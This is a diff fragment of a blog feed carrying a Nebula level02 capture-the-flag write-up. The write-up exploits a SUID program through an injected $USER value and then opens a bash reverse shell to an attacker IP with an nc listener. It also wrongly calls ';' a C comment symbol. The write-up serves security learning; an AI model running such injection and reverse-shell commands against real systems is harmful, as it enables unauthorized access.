+&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;level02@nebula:/home/flag02$&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;export &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;USER&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;getflag
+&lt;span class=&quot;gp&quot;&gt;level02@nebula:/home/flag02$&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$USER&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;getflag
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now let’s run the application and see the output.&lt;/p&gt;
+
+&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;level02@nebula:/home/flag02$&lt;/span&gt; ./flag02
+&lt;span class=&quot;go&quot;&gt;about to call system(&quot;/bin/echo getflag is cool&quot;)
+getflag is cool
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;level02@nebula:/home/flag02$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We are controlling the value of $USER but we need to both ensure that we comment the command in order to execute our instructions. In C/C++ we can comment commands with the symbol “;”. So let’s do this:&lt;/p&gt;
+
+&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;level02@nebula:/home/flag02$&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;export &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;USER&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'; getflag;'&lt;/span&gt;
+&lt;span class=&quot;gp&quot;&gt;level02@nebula:/home/flag02$&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$USER&lt;/span&gt;
+&lt;span class=&quot;gp&quot;&gt;;&lt;/span&gt; getflag&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;gp&quot;&gt;level02@nebula:/home/flag02$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now let’s execute:&lt;/p&gt;
+
+&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;level02@nebula:/home/flag02$&lt;/span&gt; ./flag02
+&lt;span class=&quot;gp&quot;&gt;about to call system(&quot;/bin/echo ;&lt;/span&gt; getflag&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; is cool&lt;span class=&quot;s2&quot;&gt;&quot;)
+&lt;/span&gt;&lt;span class=&quot;go&quot;&gt;
+You have successfully executed getflag on a target account
+sh: is: command not found
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;level02@nebula:/home/flag02$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Funny thing is that “sh: is: command not found” means that the program is trying to execute system command “is”. Have you ever tried a reverse shell? Ok let’s take control of the user “flag02” because of this SUID vulnerable program.&lt;/p&gt;
+
+&lt;p&gt;Steps for standard reverse shell:&lt;/p&gt;
+
+&lt;p&gt;Attacker is listening to everything on a port&lt;/p&gt;
+
+&lt;p&gt;The target is connecting to the attacker IP on the port (either by standard command or by certain exploits for certain programs ⇒ SUID in our case)&lt;/p&gt;
+
+&lt;p&gt;Attacker is sending back commands! ⇒ Reverse Shell&lt;/p&gt;
+
+&lt;p&gt;Nebula system (aka target):&lt;/p&gt;
+
+&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;level02@nebula:/home/flag02$&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;uid=1003(level02) gid=1003(level02) groups=1003(level02)
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;level02@nebula:/home/flag02$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;⇒ I am logged in as user “level02”&lt;/p&gt;
+
+&lt;p&gt;My system (aka attacker) is starting the listening procedure:&lt;/p&gt;
+
+&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;lucian@vm:~$&lt;/span&gt; nc &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 8080 &lt;span class=&quot;nt&quot;&gt;-vvv&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;Listening on [0.0.0.0] (family 0, port 8080)
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Nebula system (aka target) is making the exploit:&lt;/p&gt;
+
+&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;level02@nebula:/home/flag02$&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;export &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;USER&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'; bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.0.104/8080 0&amp;gt;&amp;amp;1;'&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;In other words this is a standard reverse shell command using bash. It could be decrypted as:&lt;/p&gt;
+
+&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;bash -i &amp;gt;&lt;/span&gt;&amp;amp; /dev/tcp/&amp;lt;attcker ip address&amp;gt;/&amp;lt;port that the attacker is listening on&amp;gt; 0&amp;gt;&amp;amp;1
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Nebula system (aka target) is running the exploit:&lt;/p&gt;
+
+&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;level02@nebula:/home/flag02$&lt;/span&gt; ./flag02
+&lt;span class=&quot;gp&quot;&gt;about to call system(&quot;/bin/echo ;&lt;/span&gt; bash &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&amp;amp; /dev/tcp/192.168.0.104/8080 0&amp;gt;&amp;amp;1&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; is cool&lt;span class=&quot;s2&quot;&gt;&quot;)
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;At this point my system (aka attacker) can execute commands as “flag02” and not as “level02” from my system (aka attacker) terminal!&lt;/p&gt;
+
+&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;lucian@vm:~$&lt;/span&gt; nc &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 8080 &lt;span class=&quot;nt&quot;&gt;-vvv&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;Listening on [0.0.0.0] (family 0, port 8080)
+Connection from [192.168.0.101] port 8080 [tcp/http-alt] accepted (family 2, sport 55773)
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;flag02@nebula:/home/flag02$&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;id
+uid=997(flag02) gid=1003(level02) groups=997(flag02),1003(level02)
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;flag02@nebula:/home/flag02$&lt;/span&gt; getflag
+&lt;span class=&quot;go&quot;&gt;getflag
+You have successfully executed getflag on a target account
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;flag02@nebula:/home/flag02$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content>
+
+      
+      
+      
+      
+      
+
+      
+        <author>
+            <name>Lucian Nitescu</name>
+          
+          
+        </author>
+      
+
+      
+        <category term="nebula" />
+      
+        <category term="writeups" />
+      
+
+      
+
+      
+        <summary type="html"></summary>
+      
+
+      
+      
+    </entry>
+  
   
   
     <entry>
@@ -67,6 +2130,7 @@ To do this level, log in as the level01 account with the password level01. Files
 &lt;h3 id=&quot;solution&quot;&gt;Solution&lt;/h3&gt;
 
 &lt;p&gt;Straight after we connect we go to flag01 account folder.&lt;/p&gt;
+
 &lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;level01@nebula:~$&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /home/flag01/
 &lt;span class=&quot;gp&quot;&gt;level01@nebula:/home/flag01$&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-al&lt;/span&gt;
 &lt;span class=&quot;go&quot;&gt;total 13
